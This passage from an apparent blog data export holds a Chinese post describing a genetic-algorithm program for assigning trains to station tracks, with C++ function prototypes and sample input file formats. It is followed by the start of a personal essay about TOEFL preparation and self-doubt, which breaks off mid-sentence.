feature?</h2>"},{"title":"到发线设计遗传算法","date":"2015-03-23T13:00:17.000Z","_content":"用遗传算法做的火车到发线选择算法\n<!--more-->\n距离写这个代码的时间已经过去太久了。这次只能是捡着要紧的尽量记录一下，不然真就要尘封在记忆当中了\n##实际应用场景##\n实际应用是这样的。不同的列车要进站，出站。来来去去各种麻烦。可是车站就这么小，轨道就这么多。如何保证最大效率的利用轨道呢？这就是一个经典的**NP完全问题**了。直接解决在大规模计算上不现实。这个时候就需要加特技了。一大堆的人工智能优化就来了。本问利用遗传算法来解决问题，duang的一下缩短了时间，不失为一种合理的尝试。\n##具体基因设计##\n既然是优化算法，就要有一个收敛性存在。对于遗传算法来说，收敛性是至关重要的。适应度是决定解的走向的。本文中的基因设计是这样的。\n```\nsdkfjh&^O$@I#@#(IUF(D*)@(#*#*&YKJhdksjfh))\n```\n由于版权问题，以上内容无法显示。\n##程序函数说明##\n把函数的具体作用说一下就可以了吧\n```\nint main ();//主函数\nvoid input(string filename);//用来进行数据读入的\nvoid crossover ( int &seed );//通过一个种子来进行随机化的交叉操作\ndouble getFitness(int member);//计算当前个体的适应度\nbool usable(int member);//计算随机出来的个体是不是能用。因为很多时候各种条件限制导致得到的子代不能用\nvoid elitist ( );//选择种群中比较牛逼的\nvoid evaluate ( );//统一计算一个种群的适应度\nint i4_uniform_ab ( int a, int b, int &seed );//获得随机数\nvoid initialize ( string filename, int &seed );//初始化\nvoid keep_the_best ( );//选择种群中好的进入下一代，同时更新最优解\nvoid mutate ( int &seed );//个体变异\ndouble r8_uniform_ab ( double a, double b, int &seed );//获得随机数\nvoid report ( int generation );//就是输出嘛\nvoid selector ( int &seed );//随机选择比较好的进入下一代\nvoid timestamp ( );//时间戳\nvoid Xover ( int one, int two, int &seed );//算是进行具体的基因交叉操作\nint covTime(char * p);//具体的实现函数，不需要懂\n```\n##输入输出##\n输出的部分就在控制台中了。得到最优解\n输入说明比较复杂，分为三个文件。\n**train_o.csv**\n为了方便表格输入，用了csv格式。数据内容一目了然。实例数据如下\n![主要数据示例](/image/20150323132423.png)\n从左到右分别是\n车次 上下行 Tdi Tfi Tk Tc\n\n**rail.txt**\n这个文件是用来描述铁路情况的。示例如下\n```\n117.6 -1 1\n135.15 -1 1\n162.83 -1 1\n0 0 1\n184.63 -1 0\n211.28 -1 0\n```\n从左到右分别表示\n平均步行距离 最大容量(-1表示没有限制) 线路上下行\n\n**RP.txt**\n用来表示咽喉情况的。具体示例如下：\n```\n5\n17  18\n18  19\n35  36\n35  37\n35  40\n\n10\n17 1 18 2\n18 1 17 2\n18 1 19 2\n18 2 19 1\n35 1 36 2\n35 1 37 2\n35 1 40 2\n35 2 36 1\n35 2 37 1\n35 2 40 1\n```\n首先写上C的数量，然后分别列出来\n然后写上咽喉的数量，分别写出来。\n\n[文件包下载](/download/train_GA2015年3月23日182310.rar)(更新时间2015-3-23 18:23:10)\n","source":"_posts/U5230U53d1U7ebfU8bbeU8ba1U9057U4f20U7b97U6cd5.md","raw":"title: \"到发线设计遗传算法\"\ndate: 2015-03-23 13:00:17\ntags: Algorithm\ncategories: Algorithm\n---\n用遗传算法做的火车到发线选择算法\n<!--more-->\n距离写这个代码的时间已经过去太久了。这次只能是捡着要紧的尽量记录一下，不然真就要尘封在记忆当中了\n##实际应用场景##\n实际应用是这样的。不同的列车要进站，出站。来来去去各种麻烦。可是车站就这么小，轨道就这么多。如何保证最大效率的利用轨道呢？这就是一个经典的**NP完全问题**了。直接解决在大规模计算上不现实。这个时候就需要加特技了。一大堆的人工智能优化就来了。本问利用遗传算法来解决问题，duang的一下缩短了时间，不失为一种合理的尝试。\n##具体基因设计##\n既然是优化算法，就要有一个收敛性存在。对于遗传算法来说，收敛性是至关重要的。适应度是决定解的走向的。本文中的基因设计是这样的。\n```\nsdkfjh&^O$@I#@#(IUF(D*)@(#*#*&YKJhdksjfh))\n```\n由于版权问题，以上内容无法显示。\n##程序函数说明##\n把函数的具体作用说一下就可以了吧\n```\nint main ();//主函数\nvoid input(string filename);//用来进行数据读入的\nvoid crossover ( int &seed );//通过一个种子来进行随机化的交叉操作\ndouble getFitness(int member);//计算当前个体的适应度\nbool usable(int member);//计算随机出来的个体是不是能用。因为很多时候各种条件限制导致得到的子代不能用\nvoid elitist ( );//选择种群中比较牛逼的\nvoid evaluate ( );//统一计算一个种群的适应度\nint i4_uniform_ab ( int a, int b, int &seed );//获得随机数\nvoid initialize ( string filename, int &seed );//初始化\nvoid keep_the_best ( );//选择种群中好的进入下一代，同时更新最优解\nvoid mutate ( int &seed );//个体变异\ndouble r8_uniform_ab ( double a, double b, int &seed );//获得随机数\nvoid report ( int generation );//就是输出嘛\nvoid selector ( int &seed );//随机选择比较好的进入下一代\nvoid timestamp ( );//时间戳\nvoid Xover ( int one, int two, int &seed );//算是进行具体的基因交叉操作\nint covTime(char * p);//具体的实现函数，不需要懂\n```\n##输入输出##\n输出的部分就在控制台中了。得到最优解\n输入说明比较复杂，分为三个文件。\n**train_o.csv**\n为了方便表格输入，用了csv格式。数据内容一目了然。实例数据如下\n![主要数据示例](/image/20150323132423.png)\n从左到右分别是\n车次 上下行 Tdi Tfi Tk Tc\n\n**rail.txt**\n这个文件是用来描述铁路情况的。示例如下\n```\n117.6 -1 1\n135.15 -1 1\n162.83 -1 1\n0 0 1\n184.63 -1 0\n211.28 -1 0\n```\n从左到右分别表示\n平均步行距离 最大容量(-1表示没有限制) 线路上下行\n\n**RP.txt**\n用来表示咽喉情况的。具体示例如下：\n```\n5\n17  18\n18  19\n35  36\n35  37\n35  40\n\n10\n17 1 18 2\n18 1 17 2\n18 1 19 2\n18 2 19 1\n35 1 36 2\n35 1 37 2\n35 1 40 2\n35 2 36 1\n35 2 37 1\n35 2 40 1\n```\n首先写上C的数量，然后分别列出来\n然后写上咽喉的数量，分别写出来。\n\n[文件包下载](/download/train_GA2015年3月23日182310.rar)(更新时间2015-3-23 18:23:10)\n","slug":"U5230U53d1U7ebfU8bbeU8ba1U9057U4f20U7b97U6cd5","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v5001mwypd647vz2t5","content":"<p>用遗传算法做的火车到发线选择算法<br><a id=\"more\"></a><br>距离写这个代码的时间已经过去太久了。这次只能是捡着要紧的尽量记录一下，不然真就要尘封在记忆当中了</p>\n<p>##实际应用场景##<br>实际应用是这样的。不同的列车要进站，出站。来来去去各种麻烦。可是车站就这么小，轨道就这么多。如何保证最大效率的利用轨道呢？这就是一个经典的<strong>NP完全问题</strong>了。直接解决在大规模计算上不现实。这个时候就需要加特技了。一大堆的人工智能优化就来了。本问利用遗传算法来解决问题，duang的一下缩短了时间，不失为一种合理的尝试。</p>\n<p>##具体基因设计##<br>既然是优化算法，就要有一个收敛性存在。对于遗传算法来说，收敛性是至关重要的。适应度是决定解的走向的。本文中的基因设计是这样的。<br><figure class=\"highlight gherkin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sdkfjh&amp;^O$<span class=\"meta\">@I#</span><span class=\"meta\">@#(IUF(D*)</span><span class=\"meta\">@(#*#*&amp;YKJhdksjfh))</span></span><br></pre></td></tr></table></figure></p>\n<p>由于版权问题，以上内容无法显示。</p>\n<p>##程序函数说明##<br>把函数的具体作用说一下就可以了吧<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span>;<span class=\"comment\">//主函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">input</span><span class=\"params\">(<span class=\"built_in\">string</span> filename)</span></span>;<span class=\"comment\">//用来进行数据读入的</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">crossover</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//通过一个种子来进行随机化的交叉操作</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">getFitness</span><span class=\"params\">(<span class=\"keyword\">int</span> member)</span></span>;<span class=\"comment\">//计算当前个体的适应度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">usable</span><span class=\"params\">(<span class=\"keyword\">int</span> member)</span></span>;<span class=\"comment\">//计算随机出来的个体是不是能用。因为很多时候各种条件限制导致得到的子代不能用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">elitist</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//选择种群中比较牛逼的</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">evaluate</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//统一计算一个种群的适应度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">i4_uniform_ab</span> <span class=\"params\">( <span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//获得随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initialize</span> <span class=\"params\">( <span class=\"built_in\">string</span> filename, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//初始化</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">keep_the_best</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//选择种群中好的进入下一代，同时更新最优解</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">mutate</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//个体变异</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">r8_uniform_ab</span> <span class=\"params\">( <span class=\"keyword\">double</span> a, <span class=\"keyword\">double</span> b, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//获得随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">report</span> <span class=\"params\">( <span class=\"keyword\">int</span> generation )</span></span>;<span class=\"comment\">//就是输出嘛</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">selector</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//随机选择比较好的进入下一代</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">timestamp</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//时间戳</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Xover</span> <span class=\"params\">( <span class=\"keyword\">int</span> one, <span class=\"keyword\">int</span> two, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//算是进行具体的基因交叉操作</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">covTime</span><span class=\"params\">(<span class=\"keyword\">char</span> * p)</span></span>;<span class=\"comment\">//具体的实现函数，不需要懂</span></span><br></pre></td></tr></table></figure></p>\n<p>##输入输出##<br>输出的部分就在控制台中了。得到最优解<br>输入说明比较复杂，分为三个文件。<br><strong>train_o.csv</strong><br>为了方便表格输入，用了csv格式。数据内容一目了然。实例数据如下<br><img src=\"/image/20150323132423.png\" alt=\"主要数据示例\"><br>从左到右分别是<br>车次 上下行 Tdi Tfi Tk Tc</p>\n<p><strong>rail.txt</strong><br>这个文件是用来描述铁路情况的。示例如下<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">117.6</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">135.15</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">162.83</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">0 </span><span class=\"number\">0</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">184.63</span> -<span class=\"number\">1</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">211.28</span> -<span class=\"number\">1</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure></p>\n<p>从左到右分别表示<br>平均步行距离 最大容量(-1表示没有限制) 线路上下行</p>\n<p><strong>RP.txt</strong><br>用来表示咽喉情况的。具体示例如下：<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"symbol\">17 </span> <span class=\"number\">18</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span> <span class=\"number\">19</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">36</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">37</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">40</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"symbol\">17 </span><span class=\"number\">1</span> <span class=\"number\">18</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">1</span> <span class=\"number\">17</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">1</span> <span class=\"number\">19</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">2</span> <span class=\"number\">19</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">36</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">37</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">40</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">36</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">37</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">40</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>首先写上C的数量，然后分别列出来<br>然后写上咽喉的数量，分别写出来。</p>\n<p><a href=\"/download/train_GA2015年3月23日182310.rar\">文件包下载</a>(更新时间2015-3-23 18:23:10)</p>\n","excerpt":"<p>用遗传算法做的火车到发线选择算法<br>","more":"<br>距离写这个代码的时间已经过去太久了。这次只能是捡着要紧的尽量记录一下，不然真就要尘封在记忆当中了</p>\n<p>##实际应用场景##<br>实际应用是这样的。不同的列车要进站，出站。来来去去各种麻烦。可是车站就这么小，轨道就这么多。如何保证最大效率的利用轨道呢？这就是一个经典的<strong>NP完全问题</strong>了。直接解决在大规模计算上不现实。这个时候就需要加特技了。一大堆的人工智能优化就来了。本问利用遗传算法来解决问题，duang的一下缩短了时间，不失为一种合理的尝试。</p>\n<p>##具体基因设计##<br>既然是优化算法，就要有一个收敛性存在。对于遗传算法来说，收敛性是至关重要的。适应度是决定解的走向的。本文中的基因设计是这样的。<br><figure class=\"highlight gherkin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sdkfjh&amp;^O$<span class=\"meta\">@I#</span><span class=\"meta\">@#(IUF(D*)</span><span class=\"meta\">@(#*#*&amp;YKJhdksjfh))</span></span><br></pre></td></tr></table></figure></p>\n<p>由于版权问题，以上内容无法显示。</p>\n<p>##程序函数说明##<br>把函数的具体作用说一下就可以了吧<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span>;<span class=\"comment\">//主函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">input</span><span class=\"params\">(<span class=\"built_in\">string</span> filename)</span></span>;<span class=\"comment\">//用来进行数据读入的</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">crossover</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//通过一个种子来进行随机化的交叉操作</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">getFitness</span><span class=\"params\">(<span class=\"keyword\">int</span> member)</span></span>;<span class=\"comment\">//计算当前个体的适应度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">usable</span><span class=\"params\">(<span class=\"keyword\">int</span> member)</span></span>;<span class=\"comment\">//计算随机出来的个体是不是能用。因为很多时候各种条件限制导致得到的子代不能用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">elitist</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//选择种群中比较牛逼的</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">evaluate</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//统一计算一个种群的适应度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">i4_uniform_ab</span> <span class=\"params\">( <span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//获得随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initialize</span> <span class=\"params\">( <span class=\"built_in\">string</span> filename, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//初始化</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">keep_the_best</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//选择种群中好的进入下一代，同时更新最优解</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">mutate</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//个体变异</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span> <span class=\"title\">r8_uniform_ab</span> <span class=\"params\">( <span class=\"keyword\">double</span> a, <span class=\"keyword\">double</span> b, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//获得随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">report</span> <span class=\"params\">( <span class=\"keyword\">int</span> generation )</span></span>;<span class=\"comment\">//就是输出嘛</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">selector</span> <span class=\"params\">( <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//随机选择比较好的进入下一代</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">timestamp</span> <span class=\"params\">( )</span></span>;<span class=\"comment\">//时间戳</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Xover</span> <span class=\"params\">( <span class=\"keyword\">int</span> one, <span class=\"keyword\">int</span> two, <span class=\"keyword\">int</span> &amp;seed )</span></span>;<span class=\"comment\">//算是进行具体的基因交叉操作</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">covTime</span><span class=\"params\">(<span class=\"keyword\">char</span> * p)</span></span>;<span class=\"comment\">//具体的实现函数，不需要懂</span></span><br></pre></td></tr></table></figure></p>\n<p>##输入输出##<br>输出的部分就在控制台中了。得到最优解<br>输入说明比较复杂，分为三个文件。<br><strong>train_o.csv</strong><br>为了方便表格输入，用了csv格式。数据内容一目了然。实例数据如下<br><img src=\"/image/20150323132423.png\" alt=\"主要数据示例\"><br>从左到右分别是<br>车次 上下行 Tdi Tfi Tk Tc</p>\n<p><strong>rail.txt</strong><br>这个文件是用来描述铁路情况的。示例如下<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">117.6</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">135.15</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">162.83</span> -<span class=\"number\">1</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">0 </span><span class=\"number\">0</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">184.63</span> -<span class=\"number\">1</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">211.28</span> -<span class=\"number\">1</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure></p>\n<p>从左到右分别表示<br>平均步行距离 最大容量(-1表示没有限制) 线路上下行</p>\n<p><strong>RP.txt</strong><br>用来表示咽喉情况的。具体示例如下：<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"symbol\">17 </span> <span class=\"number\">18</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span> <span class=\"number\">19</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">36</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">37</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span> <span class=\"number\">40</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"symbol\">17 </span><span class=\"number\">1</span> <span class=\"number\">18</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">1</span> <span class=\"number\">17</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">1</span> <span class=\"number\">19</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">18 </span><span class=\"number\">2</span> <span class=\"number\">19</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">36</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">37</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">1</span> <span class=\"number\">40</span> <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">36</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">37</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">35 </span><span class=\"number\">2</span> <span class=\"number\">40</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>首先写上C的数量，然后分别列出来<br>然后写上咽喉的数量，分别写出来。</p>\n<p><a href=\"/download/train_GA2015年3月23日182310.rar\">文件包下载</a>(更新时间2015-3-23 18:23:10)</p>"},{"title":"撕扯自己","date":"2014-10-27T11:59:01.000Z","_content":"考完托福，心里也是百感交集。眼看身边各位杀T战友一个个如释重负，想着身边的哥们YZ也是两个考试都已完结，心里不觉一阵怅然。你们都结束战斗了，而我还有下一次，还有接下来的一阵子的努力，一个人的努力。\n\n<!--more-->\n虽然如此，回到学校了还是没心没肺的玩了一下午一晚上。\n\n回头想想吧，还是一件很有意思的事情。问我昨天下午晚上玩的爽吗？好吧，答案肯定是一点都不爽。似乎有很多事情，只有在很忙的时候才觉得很有兴趣，才很愿意干。一旦决定好好放松一下，就真的没有什么事情可以刺激我那已经麻木的神经了。 早上起来，心里不知道为啥，一阵一阵抑制不住的恐慌。考试是不是过不去了？女朋友是不是又生气了？今天该干些什么才能让我学得更好？其实想下去，最惶恐的还是，以后的生活会不会一直是这个状态！\n\n印象中有人说过，一个人一辈子的状态总是很相似的，一辈子的操劳，或者一辈子的爱生活。 揣着沉甸甸的惶恐，愣愣的上个厕所，买点东西，回来发呆。想着想着就笑起来了。所谓自己没有那么轻松，应该就是没有那么热爱生活吧。\n\n低头看看表，10月27日11:11。北京又降温了，冷风刺骨，但也正是这冷风，把天空吹得格外明媚。往日在雾霾的包围中冲向操场的天台，哆哆嗦嗦拿出白纸写下一行一行的笔记，重复一遍一遍的口语。裹裹轻薄的外衣，拥抱一下自己，顺便跟自己说一句：“Warmer clothes are crucial for your health”。\n\n生活原本可以很可爱，很自由的。只不过有了欲望，欲望就会变成一条铁链，让真个人就变得不自由。 佛所说的无欲无求，还真是热爱生活快乐开心的真谛啊！ 说实话，我自己真的无比向往快乐，幻想的生活。最近星爷名作上映，想去！不是作，只是想认真感受一下“我的意中人是个盖世英雄，有一天他会踩着七色的云彩来娶我”的美好幻想，一个让我无论何时都热泪盈眶的幻想；认真感受一下“如果非要在这份爱上加上一个期限，我希望是……一万年……”的绝望和悲壮的画面，一个让我感受到男人的力量和无奈的画面。情绪，无论在什么时候都可以无限改变对任何事情的看法和感受。过一段时间再去体会同样的作品，加上自己的感受和印证，不得不说，有些作品真的是被我们低估了。\n\n很多时候我都在想，从小以来的教育究竟有多大的力量！可以完全造就不同的人的不同的性格。而我，很不幸，被深深地刻入了追求结果，不断追逐不断满足自己欲望的性格。悲观，虽然我不愿意这么说，确实是我面对很多事情的态度。想改，或许不是那么的容易。从小对于名利的追逐，造成了我整个人的情绪化，从小受惯了欺负，让我对别人的言行异常敏感。一句话包含了一点点的异常因素都会让我无限的放大，无限的折磨自己。还好，上帝在赐予我敏感心理的同时，给予了我隐藏自己情绪的能力。让我还能够继续勉强生活在这危机四伏关系复杂的圈子中。\n\n很久了，一直致力于能够改一下自己这个习惯，最后发现还是徒劳。小的时候那么纯真的年代很少有认可和鼓励，长大了还会有什么期待吗？所有人心里的鄙视都被套上了华丽的外衣，看到的永远是虚假无力的赞誉。有时候即使是真的夸奖，也会在自己心中被无声的冲走，填补自己心中心虚和无助的空洞。\n\n从小带来的自卑与心虚，只能用如今强撑起来的自信掩盖。不断的锻炼，不停地看各种书，不断地学习各种乐器，各种技能，不断地写一些代码，初衷都是为了填补心中自卑的空洞。这个空洞太大，以至于我必须想要用所有的时间去做一些“有价值”的事情。这种强撑的没有基础没有实质的自信，只是自己撑起一个巨大的壳子，证明自己很强大。岂不知这个壳子一捅就破，经不起推敲。一旦不小心戳到了痛处，这个巨大的壳子就会马上分崩离析，留给自己的只剩下一个蜷缩在一角的悲观无助的身影。\n\n这里似乎也很顺利了。我为什么学不好英语？很简单，自己的自卑让自己习惯于用最快的方式和最直接的办法获得实质性的价值。这么久了，除了被逼无奈的事情，自己从来没有认真的积累过。遇到这种需要积累的事情，虽然时间足够，但是自己总是无法面对自己不能立即获得收获的事实。平常的一篇阅读题，做的不好了大体看看再做下一套，希望能做得好一点。但是事实呢？能力没有任何的提升。太过于急功近利导致了